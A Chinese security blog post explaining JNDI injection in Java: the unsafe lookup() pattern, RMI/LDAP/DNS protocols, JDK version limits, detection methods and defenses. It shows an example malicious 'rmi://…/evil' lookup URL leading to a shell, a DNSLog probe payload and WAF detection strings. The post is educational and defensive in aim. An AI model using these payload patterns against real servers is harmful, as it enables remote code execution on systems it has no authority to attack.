---
title: 皮皮宋渗透日记19｜JNDI 注入避坑指南，别再被面试问懵了！
url: https://mp.weixin.qq.com/s/0VQQ4y5_DtsGxUW8at5keg
source: Doonsec's feed
date: 2026-04-06
fetch_date: 2026-04-07T04:28:45.675047
---

# 皮皮宋渗透日记19｜JNDI 注入避坑指南，别再被面试问懵了！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/3PxWhY8513YIxnlzQs9xtuPXrIUFibpuVmKV9CehZcLibTPLWu8o7SYcvqSz6Bn04FMJvgopauCXYXZrQcpBl0OGb1yAWXC9hahb5kyCfL53w/0?wx_fmt=jpeg)

# 皮皮宋渗透日记19｜JNDI 注入避坑指南，别再被面试问懵了！

原创

皮皮宋
皮皮宋

皮皮宋渗透笔记

![]()

在小说阅读器中沉浸阅读

大家好，我是皮皮宋✨

今天聊个实在的 ——JNDI 注入，这玩意儿真的是 Java 安全的 “老熟人”，也是我刚开始学渗透时最头疼的知识点。

不是我夸张，很多兄弟学到后面，把 Log4j2、Shiro、Fastjson 和 JNDI 混在一起，面试被问一句 “JNDI 到底怎么触发的”，直接卡壳。

其实说白了，JNDI 一点都不复杂，今天我就用自己实战总结的经验，掰开揉碎了讲，没有生硬的理论，全是能直接用在面试、渗透里的干货，新手也能轻松看懂。

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513aNZ72rePf7nCzQz63icGAwwpMdUHkM28Hibt8ujMibCJLiaG1YIXqmib1SwX2oCbiaoHicQ9VTDPWYF2DSV45dqXh5Azhn0mbTEOXLDI/640?wx_fmt=gif&from=appmsg)先跟大家说个大实话：JNDI 本身不是漏洞，是 Java 自带的一个 “工具”。

它的全称是 Java Naming and Directory Interface，翻译过来就是 Java 命名与目录服务 API。说白了，它的作用就是帮 Java 程序 “找东西”—— 不管是远程的对象、配置文件，还是目录服务，只要通过它提供的统一接口，就能轻松找到。

但问题就出在 “找东西” 的方式上 ——JNDI 支持用 URL 格式去查找远程对象，比如 ldap://、rmi:// 这些协议，只要程序里把用户输入的内容，直接拼进了 JNDI 的查找地址里，漏洞就来了。

举个最直观的例子：如果程序里有这么一行代码 Context.lookup (用户输入)，那攻击者只要构造一个恶意的 URL，比如 rmi:// 自己的服务器 /evil，服务器就会傻乎乎地去请求这个地址，下载里面的恶意类，然后执行代码，直接被 getshell。

这就是 JNDI 注入的核心逻辑，没有那么多花里胡哨的理论，本质就是 “用户可控输入 + 远程加载恶意类”。

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513aNZ72rePf7nCzQz63icGAwwpMdUHkM28Hibt8ujMibCJLiaG1YIXqmib1SwX2oCbiaoHicQ9VTDPWYF2DSV45dqXh5Azhn0mbTEOXLDI/640?wx_fmt=gif&from=appmsg)再说说大家最常搞混的点：JNDI 支持哪些协议，实战中该用哪个？

我实战总结下来，常用的就 3 个，其他的基本用不上，记这 3 个就够了：

第一个是 RMI，远程方法调用，默认端口 1099，是早期 JNDI 注入最常用的协议，现在虽然不如 LDAP 流行，但低版本 JDK 里依旧能用上。

第二个是 LDAP，轻量级目录访问协议，端口 389 或者 1389，这两年最火的，不管是 Log4j2 漏洞，还是 Fastjson 漏洞，基本都靠它来利用，实战中用得最多。

第三个是 DNS，这个不直接用来 getshell，主要是做 “带外检测”—— 比如构造一个 dns://xxx.dnslog.cn的 Payload，只要 DNSLog 平台有解析记录，就说明漏洞存在，简单又高效，新手必学。

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513aNZ72rePf7nCzQz63icGAwwpMdUHkM28Hibt8ujMibCJLiaG1YIXqmib1SwX2oCbiaoHicQ9VTDPWYF2DSV45dqXh5Azhn0mbTEOXLDI/640?wx_fmt=gif&from=appmsg)还有一个高频考点，也是我当初踩过的坑：经典 JNDI 注入，到底需要 ObjectFactory 吗？

答案是：不需要！

很多兄弟把 Log4j2 和原生 JNDI 搞混了，Log4j2 需要 ObjectFactory，因为它只能处理 Reference 类型，必须通过工厂的 getObjectInstance () 方法才能执行恶意代码。

但原生的 JNDI 注入不一样，只要 JDK 版本够低，攻击者构造一个远程恶意类，里面写个静态代码块或者构造方法，服务器加载这个类的时候，恶意代码会自动执行，根本不需要什么工厂类，简单粗暴。

这里插一句实战小技巧：判断 JNDI 注入是否成功，其实很简单，就 3 个方法，亲测有效：

1. 查流量：服务器一定会主动外联，找防火墙或者流量设备，看有没有 1099、389、1389 这些端口的出站流量，有就大概率中了；
2. DNSLog 检测：这是最省事的，不管有没有回显，用 dns:// 的 Payload 试一下，有解析记录就说明触发成功；
3. 看系统行为：比如弹计算器、反弹 shell，或者用工具查一下，有没有新增的恶意内存马（比如 Filter、Interceptor），这些都是注入成功的迹象。

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513aNZ72rePf7nCzQz63icGAwwpMdUHkM28Hibt8ujMibCJLiaG1YIXqmib1SwX2oCbiaoHicQ9VTDPWYF2DSV45dqXh5Azhn0mbTEOXLDI/640?wx_fmt=gif&from=appmsg)

聊到这里，就必须说一下 JDK 版本的限制，这绝对是 JNDI 注入的 “分水岭”，面试必问，实战必看。

我整理了最常用的几个 JDK 版本，大家记好，不用死记硬背，理解就行：

* JDK 8u121 之前：没有任何限制，RMI、LDAP 随便用，只要有漏洞，就能轻松 getshell；
* JDK 8u121：开始加防护了，默认关闭 RMI 远程类加载，但 LDAP 还能绕，危害依旧很大；
* JDK 8u191：进一步收紧，彻底禁用 RMI 远程加载，哪怕手动开启也没用，不过 LDAP 还有间接利用的方法；
* JDK 8u201：这是真正的安全线，彻底禁用了 LDAP 远程类加载，不管怎么配置，常规的 JNDI 利用链基本都失效了；
* JDK 11 及以上：继承了 8u201 的所有限制，默认禁止一切 JNDI 远程代码加载，基本没法常规利用。

简单总结一句：JDK≤8u191，JNDI 注入随便打；JDK≥8u201，基本就不用想常规利用了，得找其他绕过方法。

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513aNZ72rePf7nCzQz63icGAwwpMdUHkM28Hibt8ujMibCJLiaG1YIXqmib1SwX2oCbiaoHicQ9VTDPWYF2DSV45dqXh5Azhn0mbTEOXLDI/640?wx_fmt=gif&from=appmsg)

最后，跟大家说一下企业级的防御方案，也是面试常考的，都是实战中能用得上的，不是那种空泛的理论：

1. 最根本的：禁止用户可控的输入，传入 JNDI 的 lookup () 方法，从源头堵住漏洞；
2. 最直接的：升级 JDK，至少升到 8u201 以上，这是成本最低、效果最好的方法；
3. 辅助防护：手动设置 trustURLCodebase 为 false，关闭远程类加载；
4. 网络层面：防火墙限制服务器出站 1099、389、1389 这些端口，不让服务器主动外联恶意地址；
5. 应急防护：WAF 拦截 ldap://、rmi://、${jndi 这些特征，能拦截大部分常规攻击。

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513aNZ72rePf7nCzQz63icGAwwpMdUHkM28Hibt8ujMibCJLiaG1YIXqmib1SwX2oCbiaoHicQ9VTDPWYF2DSV45dqXh5Azhn0mbTEOXLDI/640?wx_fmt=gif&from=appmsg)写在最后：

JNDI 注入看似复杂，其实核心就一句话：用户可控输入 + 远程加载恶意类。

它不是一个孤立的漏洞，而是很多高危漏洞（Log4j2、Fastjson 等）的 “核心通道”，吃透了 JNDI，再学其他 Java 相关漏洞，会轻松很多。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3PxWhY8513Zfy356KwQVqTkYAGRJ3ic3bosy60LwxmpYficUeMiceQiaOMkpR0sx7XGuMs1yJgXC4xEcMTOSDEuqFkniciaIZJoad51nXRVkk1rWM/640?wx_fmt=png&from=appmsg)

感谢您抽出 ![图片](https://mmbiz.qpic.cn/mmbiz_gif/jzC1MZl7uvpkwDV3NcrFRpT6QRJSY1j2fmBhd9q58lS5Y7AD6wFEcDwATcl4EE4opylqeM9SfvgqfPhuyibX68w/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp) ![图片](https://mmbiz.qpic.cn/mmbiz_gif/jzC1MZl7uvpkwDV3NcrFRpT6QRJSY1j2ibfVug8UCLkFuUujUoSyOXh5CqOQCEKIcfKnW1GQ44x9Ne70wEdZfag/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp)·![图片](https://mmbiz.qpic.cn/mmbiz_gif/jzC1MZl7uvpkwDV3NcrFRpT6QRJSY1j2uXNXnTIfFfy57Se7rsutTQf1dl4F9IWEs68rhI1h92t0dMmVCFfu2Q/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp) ![图片](https://mmbiz.qpic.cn/mmbiz_gif/jzC1MZl7uvpkwDV3NcrFRpT6QRJSY1j2BoAnxnn1vrz1ZNoqcUckl4UCVfhTOsCy3meVib6Bc8juibR7LEZqWO1g/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp)来阅读此文，觉得不错的话记得点个赞和在看

![](https://mmbiz.qpic.cn/mmbiz_gif/3PxWhY8513bsCAJic7zCKv1WWR9cxMiaHJ86FnEBgvJHR3FzbusGJpCqiaYRzqhv6qeHUyJ2aNfcn4VgbvSOdTIaR6YlSAVMYvLa9TTXRhiaNiaY/640?wx_fmt=gif&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/CrpWk11pwIicrkmF1ZAbZl48vjGQFt5MKRmdXeAcNxicBjVnQqx3DYUqGd2UhqveP86KHpS0CYUoSia6QAF01kVhw/0?wx_fmt=png)

皮皮宋渗透笔记

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/CrpWk11pwIicrkmF1ZAbZl48vjGQFt5MKRmdXeAcNxicBjVnQqx3DYUqGd2UhqveP86KHpS0CYUoSia6QAF01kVhw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过